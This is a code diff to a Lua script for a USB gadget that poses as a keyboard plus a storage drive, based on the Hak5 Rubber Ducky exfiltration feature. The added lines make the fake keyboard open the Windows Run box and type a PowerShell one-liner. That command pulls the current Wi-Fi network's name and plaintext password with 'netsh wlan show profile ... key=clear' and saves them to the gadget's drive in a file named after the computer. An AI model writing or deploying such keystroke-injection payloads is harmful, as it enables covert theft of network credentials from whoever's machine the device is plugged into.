@@ -1,10 +1,11 @@
 ---
 --- Copy a file from the system to a mass storage gadget
+--- https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/exfiltration
 ---
 usb = luausb.create({ id = 0, type = "keyboard"}, {id = 0, type = "storage" })
 kb = usb.dev[1]
 
-local LABEL = "MY_DRIVE_LABEL" -- label of the drive (as assigned by you)
+local LABEL = "COMPOSITE" -- label of the drive (as assigned by you)
 
 while true do
     print("idle")
@@ -20,9 +21,10 @@ while true do
 
     kb.chord(MOD_LSUPER, KEY_R)
     wait(1000)
-    kb.string("powershell\n")
-    wait(2000)
-    kb.string("$drive = Get-WmiObject -Class Win32_LogicalDisk -Filter \"VolumeName='" .. LABEL .. "'\" | Select -Expand DeviceID\n")
+    kb.string("powershell \"$m=(Get-Volume -FileSystemLabel '" .. LABEL .. "').DriveLetter;"
+              .. "netsh wlan show profile name=(Get-NetConnectionProfile).Name key="
+              .. "clear|?{$_-match'SSID n|Key C'}|%{($_ -split':')[1]}>>$m':\\'$env:"
+              .. "computername'.txt'\"\n")
 
     print("done")
     -- poll until usb unplugged
